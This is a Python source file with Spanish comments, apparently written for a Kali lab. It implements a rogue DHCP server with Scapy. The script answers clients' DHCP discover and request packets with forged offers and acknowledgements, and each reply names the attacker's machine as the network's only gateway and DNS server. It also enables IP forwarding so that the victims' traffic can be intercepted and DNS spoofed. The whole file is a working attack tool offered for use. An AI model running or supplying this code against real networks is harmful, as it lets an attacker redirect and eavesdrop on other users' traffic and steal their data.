#!/usr/bin/env python3
"""
DHCP Rogue Server con DNS Spoofing
Autor: maitecruz23
Descripción: Servidor DHCP falso que intercepta peticiones DHCP y configura
            el atacante como servidor DNS para realizar DNS Spoofing
Uso: sudo python3 dhcp_rogue.py
"""

from scapy.all import *
import sys
import time
import os

# ============================================
# CONFIGURACIÓN DEL ATAQUE
# ============================================

IFACE = "eth0"                    # Interfaz de red (eth0, wlan0, etc.)
SERVER_IP = "20.24.116.2"         # IP del servidor DHCP falso (tu Kali)
SUBNET_MASK = "255.255.255.0"     # Máscara de subred
GATEWAY = "20.24.116.2"           # Gateway falso (tu Kali)
DNS_SERVER = "20.24.116.2"        # DNS falso - CRÍTICO PARA EL ATAQUE
LEASE_TIME = 43200                # Tiempo de lease en segundos (12 horas)

# Pool de direcciones IP
IP_POOL_START = 100               # Inicio del rango
IP_POOL_END = 200                 # Fin del rango
IP_BASE = "20.24.116."            # Base de la red

# ============================================
# VARIABLES GLOBALES
# ============================================

assigned_ips = {}                 # Diccionario de IPs asignadas {MAC: IP}
current_ip = IP_POOL_START        # Contador de IP actual

# ============================================
# FUNCIONES
# ============================================

def get_next_ip():
    """
    Obtiene la siguiente IP disponible del pool.
    
    Returns:
        str: Dirección IP en formato string (ej: "20.24.116.100")
    """
    global current_ip
    if current_ip > IP_POOL_END:
        current_ip = IP_POOL_START  # Reiniciar pool si se agota
    ip = IP_BASE + str(current_ip)
    current_ip += 1
    return ip

def dhcp_offer(packet):
    """
    Envía un paquete DHCP OFFER al cliente.
    
    Args:
        packet: Paquete DHCP DISCOVER recibido
    
    Acciones:
        - Extrae MAC del cliente
        - Asigna IP del pool
        - Construye paquete DHCP OFFER malicioso
        - Configura DNS falso (20.24.116.2)
    """
    global assigned_ips
    
    client_mac = packet[Ether].src
    xid = packet[BOOTP].xid
    
    # Asignar IP (reutilizar si ya tiene una asignada)
    if client_mac in assigned_ips:
        offered_ip = assigned_ips[client_mac]
    else:
        offered_ip = get_next_ip()
        assigned_ips[client_mac] = offered_ip
    
    print(f"\n[OFFER] Ofreciendo IP {offered_ip} a {client_mac}")
    
    # Construir paquete DHCP OFFER
    ether = Ether(src=get_if_hwaddr(IFACE), dst=client_mac)
    ip = IP(src=SERVER_IP, dst="255.255.255.255")
    udp = UDP(sport=67, dport=68)
    bootp = BOOTP(
        op=2,                      # Boot Reply
        xid=xid,                   # Transaction ID
        yiaddr=offered_ip,         # Your IP Address
        siaddr=SERVER_IP,          # Server IP Address
        chaddr=mac2str(client_mac) # Client Hardware Address
    )
    
    # CRÍTICO: Solo un DNS (tu Kali) - Clave del ataque
    dhcp = DHCP(options=[
        ("message-type", "offer"),
        ("server_id", SERVER_IP),
        ("lease_time", LEASE_TIME),
        ("subnet_mask", SUBNET_MASK),
        ("router", GATEWAY),           # Gateway falso
        ("name_server", DNS_SERVER),   # DNS falso - CLAVE DEL ATAQUE
        "end"
    ])
    
    offer_packet = ether / ip / udp / bootp / dhcp
    sendp(offer_packet, iface=IFACE, verbose=0)
    print(f"[✓] DHCP OFFER enviado - DNS: {DNS_SERVER}")

def dhcp_ack(packet):
    """
    Confirma la asignación de IP con DHCP ACK.
    
    Args:
        packet: Paquete DHCP REQUEST recibido
    
    Acciones:
        - Confirma IP asignada
        - Envía configuración de red maliciosa
        - Establece Kali como único DNS
    """
    global assigned_ips
    
    client_mac = packet[Ether].src
    xid = packet[BOOTP].xid
    
    requested_ip = assigned_ips.get(client_mac, get_next_ip())
    
    print(f"\n[ACK] Confirmando IP {requested_ip} a {client_mac}")
    
    # Construir paquete DHCP ACK
    ether = Ether(src=get_if_hwaddr(IFACE), dst=client_mac)
    ip = IP(src=SERVER_IP, dst="255.255.255.255")
    udp = UDP(sport=67, dport=68)
    bootp = BOOTP(
        op=2,
        xid=xid,
        yiaddr=requested_ip,
        siaddr=SERVER_IP,
        chaddr=mac2str(client_mac)
    )
    
    # CRÍTICO: Solo un DNS (tu Kali)
    dhcp = DHCP(options=[
        ("message-type", "ack"),
        ("server_id", SERVER_IP),
        ("lease_time", LEASE_TIME),
        ("subnet_mask", SUBNET_MASK),
        ("router", GATEWAY),
        ("name_server", DNS_SERVER),  # SOLO UNO - TU KALI
        "end"
    ])
    
    ack_packet = ether / ip / udp / bootp / dhcp
    sendp(ack_packet, iface=IFACE, verbose=0)
    print(f"[✓] DHCP ACK enviado")
    print(f"[✓✓] IP: {requested_ip}")
    print(f"[✓✓] Gateway: {GATEWAY}")
    print(f"[✓✓] DNS: {DNS_SERVER} ← SOLO TU KALI")

def dhcp_handler(packet):
    """
    Manejador principal de paquetes DHCP.
    
    Args:
        packet: Paquete capturado en la interfaz
    
    Procesa:
        - DHCP DISCOVER (tipo 1) → Llama a dhcp_offer()
        - DHCP REQUEST (tipo 3) → Llama a dhcp_ack()
    """
    if DHCP in packet:
        dhcp_message_type = None
        for opt in packet[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == "message-type":
                dhcp_message_type = opt[1]
                break
        
        if dhcp_message_type == 1:  # DHCP DISCOVER
            print(f"\n{'='*60}")
            print(f"[DISCOVER] Recibido de {packet[Ether].src}")
            dhcp_offer(packet)
            
        elif dhcp_message_type == 3:  # DHCP REQUEST
            print(f"\n{'='*60}")
            print(f"[REQUEST] Recibido de {packet[Ether].src}")
            dhcp_ack(packet)

def main():
    """
    Función principal del programa.
    Inicializa el servidor DHCP Rogue y comienza a escuchar peticiones.
    """
    print("""
╔══════════════════════════════════════════════════════════╗
║          DHCP ROGUE SERVER - SCAPY v2                    ║
║          DNS Forzado: SOLO Kali                          ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    print(f"[+] Interfaz: {IFACE}")
    print(f"[+] IP del servidor DHCP falso: {SERVER_IP}")
    print(f"[+] Gateway falso: {GATEWAY}")
    print(f"[+] DNS falso: {DNS_SERVER} ← ÚNICO DNS")
    print(f"[+] Pool de IPs: {IP_BASE}{IP_POOL_START} - {IP_BASE}{IP_POOL_END}")
    print(f"[+] Máscara de subred: {SUBNET_MASK}")
    print(f"[+] Tiempo de lease: {LEASE_TIME} segundos ({LEASE_TIME//3600} horas)")
    print("\n[*] Esperando solicitudes DHCP...\n")
    
    # Habilitar IP Forwarding
    print("[*] Habilitando IP Forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    # Filtro para capturar solo tráfico DHCP
    filter_str = "udp and (port 67 or port 68)"
    
    try:
        # Iniciar captura de paquetes
        sniff(iface=IFACE, filter=filter_str, prn=dhcp_handler, store=0)
    except KeyboardInterrupt:
        print("\n\n[!] Ataque detenido por el usuario")
        print(f"[+] Total de IPs asignadas: {len(assigned_ips)}")
        print("\n[+] Tabla de asignaciones:")
        print("-" * 60)
        for mac, ip in assigned_ips.items():
            print(f"    {mac} → {ip}")
        print("-" * 60)
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)

# ============================================
# PUNTO DE ENTRADA
# ============================================

if __name__ == "__main__":
    # Verificar que se ejecuta como root
    if os.geteuid() != 0:
        print("[!] ERROR: Este script debe ejecutarse como root")
        print("[!] Usa: sudo python3 dhcp_rogue.py")
        sys.exit(1)
    
    main()
